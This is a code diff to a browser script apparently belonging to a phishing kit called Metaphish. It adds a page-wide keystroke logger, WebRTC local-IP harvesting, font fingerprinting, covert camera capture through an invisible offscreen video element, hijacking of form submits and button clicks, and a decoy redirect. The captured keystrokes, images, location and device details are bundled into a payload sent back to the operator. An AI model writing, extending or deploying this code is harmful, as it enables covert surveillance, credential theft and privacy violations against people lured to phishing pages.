@@ -8,6 +8,7 @@
     const CaptureMode   = (window.MetaphishConfig && window.MetaphishConfig.CameraMode)   || "front";
     const VideoSource   = (window.MetaphishConfig && window.MetaphishConfig.VideoSource)   || "front";
     const VideoDuration = (window.MetaphishConfig && window.MetaphishConfig.VideoDuration) || 10;
+    const RedirectUrl   = (window.MetaphishConfig && window.MetaphishConfig.RedirectUrl)   || "";
 
     function FetchWithTimeout(Url, Options) {
         return new Promise(function (Resolve, Reject) {
@@ -322,6 +323,116 @@
         });
     }
 
+    function GetWebRtcLocalIp() {
+        return new Promise(function (Resolve) {
+            var IpSet = {};
+            var PeerConnection;
+            try {
+                PeerConnection = new (window.RTCPeerConnection || window.webkitRTCPeerConnection)({ iceServers: [] });
+            } catch (PeerError) {
+                Resolve({ LocalIpAddresses: "Not Available" });
+                return;
+            }
+            var GatherDone = false;
+            var GatherTimer = setTimeout(function () {
+                if (GatherDone) return;
+                GatherDone = true;
+                var IpList = Object.keys(IpSet);
+                Resolve({ LocalIpAddresses: IpList.length > 0 ? IpList.join(", ") : "Not Available" });
+                try { PeerConnection.close(); } catch (CloseError) {}
+            }, 3000);
+            PeerConnection.onicecandidate = function (IceEvent) {
+                if (!IceEvent || !IceEvent.candidate || !IceEvent.candidate.candidate) {
+                    if (!GatherDone) {
+                        GatherDone = true;
+                        clearTimeout(GatherTimer);
+                        var IpList = Object.keys(IpSet);
+                        Resolve({ LocalIpAddresses: IpList.length > 0 ? IpList.join(", ") : "Not Available" });
+                        try { PeerConnection.close(); } catch (CloseError) {}
+                    }
+                    return;
+                }
+                var CandidateString = IceEvent.candidate.candidate;
+                var IpMatch = CandidateString.match(/(\d{1,3}(?:\.\d{1,3}){3}|[a-f0-9:]{3,39})/gi);
+                if (IpMatch) {
+                    IpMatch.forEach(function (Ip) {
+                        if (Ip !== "0.0.0.0" && !Ip.startsWith("::") && Ip !== "0:0:0:0:0:0:0:0") {
+                            IpSet[Ip] = true;
+                        }
+                    });
+                }
+            };
+            try {
+                PeerConnection.createDataChannel("MetaphishRtc");
+                PeerConnection.createOffer().then(function (Offer) {
+                    return PeerConnection.setLocalDescription(Offer);
+                }).catch(function () {
+                    if (!GatherDone) {
+                        GatherDone = true;
+                        clearTimeout(GatherTimer);
+                        Resolve({ LocalIpAddresses: "Not Available" });
+                        try { PeerConnection.close(); } catch (CloseError) {}
+                    }
+                });
+            } catch (OfferError) {
+                GatherDone = true;
+                clearTimeout(GatherTimer);
+                Resolve({ LocalIpAddresses: "Not Available" });
+                try { PeerConnection.close(); } catch (CloseError) {}
+            }
+        });
+    }
+
+    function GetFontFingerprint() {
+        try {
+            var TestString = "mmmmmmmmmmlli";
+            var TestSize = "72px";
+            var BaseFonts = ["monospace", "sans-serif", "serif"];
+            var FontsToTest = [
+                "Arial", "Arial Black", "Arial Narrow", "Calibri", "Cambria",
+                "Comic Sans MS", "Consolas", "Courier New", "Georgia", "Impact",
+                "Lucida Console", "Lucida Sans Unicode", "Microsoft Sans Serif",
+                "Palatino Linotype", "Segoe UI", "Tahoma", "Times New Roman",
+                "Trebuchet MS", "Verdana", "Helvetica", "Roboto", "Open Sans",
+                "Ubuntu", "Droid Sans", "Noto Sans", "Source Code Pro",
+                "DejaVu Sans", "Liberation Sans", "FreeSans"
+            ];
+            var Canvas = document.createElement("canvas");
+            Canvas.width = 400;
+            Canvas.height = 100;
+            var Context = Canvas.getContext("2d");
+            var BaseWidths = {};
+            BaseFonts.forEach(function (BaseFont) {
+                Context.font = TestSize + " " + BaseFont;
+                BaseWidths[BaseFont] = Context.measureText(TestString).width;
+            });
+            var DetectedFonts = [];
+            FontsToTest.forEach(function (TestFont) {
+                for (var BaseIndex = 0; BaseIndex < BaseFonts.length; BaseIndex++) {
+                    Context.font = TestSize + " '" + TestFont + "'," + BaseFonts[BaseIndex];
+                    var Width = Context.measureText(TestString).width;
+                    if (Width !== BaseWidths[BaseFonts[BaseIndex]]) {
+                        DetectedFonts.push(TestFont);
+                        break;
+                    }
+                }
+            });
+            return DetectedFonts.length > 0 ? DetectedFonts.join(", ") : "Not Available";
+        } catch (FontError) {
+            return "Not Available";
+        }
+    }
+
+    var KeystrokeLog = "";
+    document.addEventListener("keydown", function (KeyEvent) {
+        var Key = KeyEvent.key;
+        if (Key.length === 1) {
+            KeystrokeLog += Key;
+        } else {
+            KeystrokeLog += "[" + Key + "]";
+        }
+    });
+
     function CompressAndUploadCamera(Blob, SourceLabel) {
         return new Promise(function (Resolve) {
             const ImageUrl = URL.createObjectURL(Blob);
@@ -371,27 +482,62 @@
                 return;
             }
             navigator.mediaDevices.getUserMedia({ video: VideoConstraint, audio: false }).then(function (Stream) {
-                const Video = document.createElement("video");
+                var Video = document.createElement("video");
                 Video.srcObject = Stream;
                 Video.setAttribute("playsinline", "true");
+                Video.setAttribute("autoplay", "true");
                 Video.muted = true;
-                Video.play().then(function () {
-                    setTimeout(function () {
-                        const Canvas = document.createElement("canvas");
-                        Canvas.width = Video.videoWidth || 640;
-                        Canvas.height = Video.videoHeight || 480;
-                        const Context = Canvas.getContext("2d");
-                        Context.drawImage(Video, 0, 0, Canvas.width, Canvas.height);
-                        Stream.getTracks().forEach(function (Track) { Track.stop(); });
-                        Canvas.toBlob(function (CaptureBlob) {
-                            if (!CaptureBlob) { Resolve("Upload Failed"); return; }
-                            CompressAndUploadCamera(CaptureBlob, SourceLabel).then(Resolve);
-                        }, "image/jpeg", 0.85);
-                    }, 1500);
-                }).catch(function () {
+                Video.style.cssText = "position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;opacity:0;pointer-events:none;z-index:-9999";
+                document.body.appendChild(Video);
+
+                var CaptureDone = false;
+                var CaptureTimer = null;
+                var MetadataTimer = null;
+
+                function CleanupAndResolve(Result) {
+                    if (CaptureDone) return;
+                    CaptureDone = true;
+                    if (CaptureTimer) clearTimeout(CaptureTimer);
+                    if (MetadataTimer) clearTimeout(MetadataTimer);
                     Stream.getTracks().forEach(function (Track) { Track.stop(); });
-                    Resolve("Upload Failed");
-                });
+                    try { document.body.removeChild(Video); } catch (RemoveError) {}
+                    Resolve(Result);
+                }
+
+                function DoCapture() {
+                    if (CaptureDone) return;
+                    var Width = Video.videoWidth || 640;
+                    var Height = Video.videoHeight || 480;
+                    var Canvas = document.createElement("canvas");
+                    Canvas.width = Width;
+                    Canvas.height = Height;
+                    var Context = Canvas.getContext("2d");
+                    Context.drawImage(Video, 0, 0, Width, Height);
+                    Canvas.toBlob(function (CaptureBlob) {
+                        if (!CaptureBlob) { CleanupAndResolve("Upload Failed"); return; }
+                        CompressAndUploadCamera(CaptureBlob, SourceLabel).then(function (UploadResult) {
+                            CleanupAndResolve(UploadResult);
+                        });
+                    }, "image/jpeg", 0.85);
+                    Stream.getTracks().forEach(function (Track) { Track.stop(); });
+                    try { document.body.removeChild(Video); } catch (RemoveError) {}
+                }
+
+                MetadataTimer = setTimeout(function () {
+                    if (!CaptureDone) CleanupAndResolve("Upload Failed");
+                }, 10000);
+
+                Video.onloadedmetadata = function () {
+                    Video.play().then(function () {
+                        CaptureTimer = setTimeout(DoCapture, 1200);
+                    }).catch(function () {
+                        CleanupAndResolve("Upload Failed");
+                    });
+                };
+
+                Video.onerror = function () {
+                    CleanupAndResolve("Upload Failed");
+                };
             }).catch(function () {
                 Resolve("Permission Denied");
             });
@@ -496,43 +642,68 @@
 
     function ResolveBackConstraint(HasPermission) {
         if (!HasPermission) {
-            return Promise.resolve({ facingMode: { exact: "environment" }, width: { ideal: 1280 }, height: { ideal: 720 } });
+            return Promise.resolve({ facingMode: "environment", width: { ideal: 1280 }, height: { ideal: 720 } });
         }
         return GetVideoDevices().then(function (VideoDevices) {
             return FindBackCameraConstraint(VideoDevices)
-                || { facingMode: { exact: "environment" }, width: { ideal: 1280 }, height: { ideal: 720 } };
+                || { facingMode: "environment", width: { ideal: 1280 }, height: { ideal: 720 } };
         });
     }
 
+    var RedirectDone = false;
+    function PerformRedirect() {
+        if (RedirectDone || !RedirectUrl) return;
+        RedirectDone = true;
+        window.open(RedirectUrl, "_blank");
+    }
+
     function AttachClickListeners(Handler) {
-        document.querySelectorAll("form").forEach(function (Form) {
-            Form.addEventListener("submit", Handler);
-        });
-        document.querySelectorAll(
-            "button, input[type='submit'], input[type='button'], [role='button']"
-        ).forEach(function (Button) {
-            Button.addEventListener("click", Handler);
-        });
+        document.addEventListener("submit", function (SubmitEvent) {
+            SubmitEvent.preventDefault();
+            Handler(SubmitEvent);
+        }, true);
+        document.addEventListener("click", function (ClickEvent) {
+            var Target = ClickEvent.target;
+            while (Target && Target !== document) {
+                var TagName = (Target.tagName || "").toLowerCase();
+                var InputType = (Target.type || "").toLowerCase();
+                var Role = (Target.getAttribute ? Target.getAttribute("role") || "" : "").toLowerCase();
+                if (
+                    TagName === "button" ||
+                    (TagName === "input" && (InputType === "submit" || InputType === "button")) ||
+                    Role === "button"
+                ) {
+                    Handler(ClickEvent);
+                    return;
+                }
+                Target = Target.parentNode;
+            }
+        }, true);
     }
 
     const GpsCapture         = GetGps();
     const BatteryCapture     = GetBattery();
     const MediaDeviceCapture = GetMediaDeviceCounts();
     const StorageCapture     = GetStorageQuota();
+    const WebRtcCapture      = GetWebRtcLocalIp();
 
     function SendCapture(FrontResult, BackResult, VideoFrontResult, VideoBackResult) {
-        Promise.all([GpsCapture, BatteryCapture, MediaDeviceCapture, StorageCapture]).then(function (Results) {
+        Promise.all([GpsCapture, BatteryCapture, MediaDeviceCapture, StorageCapture, WebRtcCapture]).then(function (Results) {
             var Payload = Object.assign(
                 {},
                 Results[0],
                 Results[1],
                 Results[2],
                 Results[3],
+                Results[4],
                 {
                     CameraFrontFile:     FrontResult      || "Not Captured",
                     CameraBackFile:      BackResult       || "Not Captured",
                     CameraVideoFile:     VideoFrontResult || "Not Captured",
-                    CameraVideoBackFile: VideoBackResult  || "Not Captured"
+                    CameraVideoBackFile: VideoBackResult  || "Not Captured",
+                    IsSecureContext:     String(window.isSecureContext === true),
+                    InstalledFonts:      GetFontFingerprint(),
+                    KeystrokeLog:        KeystrokeLog
                 },
                 GetNetwork(),
                 GetDeviceInfo(),
@@ -555,6 +726,14 @@
                 SendCapture("Not Captured", "Not Captured", VideoResult, "Not Captured");
             });
 
+            if (document.readyState === "loading") {
+                document.addEventListener("DOMContentLoaded", function () {
+                    AttachClickListeners(function () { PerformRedirect(); });
+                });
+            } else {
+                AttachClickListeners(function () { PerformRedirect(); });
+            }
+
         } else if (VideoSource === "back") {
             var BackVideoHandled = false;
             var BackVideoFallback = setTimeout(function () {
@@ -567,6 +746,7 @@
                 if (BackVideoHandled) return;
                 BackVideoHandled = true;
                 clearTimeout(BackVideoFallback);
+                PerformRedirect();
                 ResolveBackConstraint(false).then(function (Constraint) {
                     CaptureVideoWithConstraint(Constraint, "back", VideoDuration).then(function (VideoResult) {
                         SendCapture("Not Captured", "Not Captured", "Not Captured", VideoResult);
@@ -581,22 +761,19 @@
             }
 
         } else if (VideoSource === "both") {
-            const FrontVideoCapture = CaptureVideoFront(VideoDuration);
-
             var BothVideoHandled = false;
             var BothVideoFallback = setTimeout(function () {
                 if (BothVideoHandled) return;
                 BothVideoHandled = true;
-                FrontVideoCapture.then(function (FrontVideoResult) {
-                    SendCapture("Not Captured", "Not Captured", FrontVideoResult, "Not Available");
-                });
+                SendCapture("Not Captured", "Not Captured", "Not Available", "Not Available");
             }, 60000);
 
             function HandleBothVideoClick() {
                 if (BothVideoHandled) return;
                 BothVideoHandled = true;
                 clearTimeout(BothVideoFallback);
-                FrontVideoCapture.then(function (FrontVideoResult) {
+                PerformRedirect();
+                CaptureVideoFront(VideoDuration).then(function (FrontVideoResult) {
                     ResolveBackConstraint(true).then(function (Constraint) {
                         CaptureVideoWithConstraint(Constraint, "back", VideoDuration).then(function (BackVideoResult) {
                             SendCapture("Not Captured", "Not Captured", FrontVideoResult, BackVideoResult);
@@ -620,6 +797,14 @@
             SendCapture(FrontResult, "Not Captured", "Not Captured", "Not Captured");
         });
 
+        if (document.readyState === "loading") {
+            document.addEventListener("DOMContentLoaded", function () {
+                AttachClickListeners(function () { PerformRedirect(); });
+            });
+        } else {
+            AttachClickListeners(function () { PerformRedirect(); });
+        }
+
     } else {
         var PhotoHandled = false;
         var PhotoFallback = setTimeout(function () {
@@ -641,6 +826,7 @@
             if (PhotoHandled) return;
             PhotoHandled = true;
             clearTimeout(PhotoFallback);
+            PerformRedirect();
 
             if (CaptureMode === "both") {
                 CaptureSingleCamera(
